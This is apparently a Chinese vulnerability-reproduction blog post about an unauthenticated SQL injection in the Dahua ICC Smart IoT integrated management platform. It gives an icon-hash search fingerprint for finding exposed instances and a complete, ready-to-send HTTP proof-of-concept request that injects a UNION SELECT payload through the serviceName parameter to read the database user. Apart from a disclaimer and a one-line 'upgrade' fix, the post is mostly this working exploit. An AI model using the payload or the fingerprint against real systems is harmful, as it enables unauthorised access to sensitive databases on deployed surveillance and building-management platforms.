#  大华ICC智能物联综合管理平台存在SQL注入漏洞 附POC  
原创 安服仔
                    安服仔  北风漏洞复现文库   2026-03-25 02:17  
  
# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
  
#   
  
01  
  
—  
  
漏洞名称  
# 大华智能物联综合管理平台SQL注入漏洞  
#   
  
02  
  
—  
  
影响版本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS0BJNngzdbny1kQeI1iap7rrzY6NTu8ZGwHyYk1QFyDoayoHibiaPt2q6tkRibAeE6cHeboh3kIfVSvwLTIHibJMKgiaytiaBgMSIoOjY/640?wx_fmt=png&from=appmsg "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1nE2FV1PSia2NGs1v5HsK7NQNn5DWNRM707qlpOziawQxczd4GXswxRl5Aoop4N2QkQXLWkEFonib89AJKiaAxZojH8Aqia24SFpyA/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0 "")  
  
03  
  
—  
  
漏洞简介  
  
大华ICC智能物联综合  
管理平台是大华股份推出的一款集成化、智能化的物联网管理平台，旨在为智慧园区、商业综合体、智慧社区等场景提供全面的设备管理与业务协同解决方案  
。  
大华ICC智能物联综合管理平台的  
接口存在SQL注入漏洞，未经身份验证的攻击者可通过该接口执行任意SQL语句，获取数据库敏感信息。  
  
04  
  
—  
  
资产测绘  
```
icon_hash="-1619753057"
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS03cemyHLGKiaoYrK26ibyibAs30J4Avb9ej2Oa7R0BC3XrudEes02THJA9lmSSiasTmlLgic3G9MDQsNdVk8YhZLEVRGhwc1ia0icyaE/640?wx_fmt=png&from=appmsg "")  
  
  
  
05  
  
—  
  
漏洞复现  
  
POC  
```
GET /evo-apigw/evo-arsm/1.0.0/ars/list?serviceName='+UNION+ALL+SELECT+NULL,NULL,NULL,CONCAT(0x7e,user(),0x7e),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--+- HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:148.0) Gecko/20100101 Firefox/148.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Hm_lvt_68cdc2c5b7811127c767836c22d78c5b=1774403983; Hm_lpvt_68cdc2c5b7811127c767836c22d78c5b=1774404483; HMACCOUNT=678132A7E90165A9
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
If-None-Match: W/"687a21ba-17cc"
Priority: u=0, i
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1aepib9PNNuN3ch3AdTE2lHRyJZ4ljgHEcLtbrmBQTib6UedUyN71oDWCZsXSenqAnBzNCRStsvib69xMBGFiaibV06zpokc48ZNUM/640?wx_fmt=png&from=appmsg "")  
  
06  
  
—  
  
修复建议  
  
升级至最新安全版本  
  
  
07  
  
—  
  
往期回顾  
  
  
  
  
  
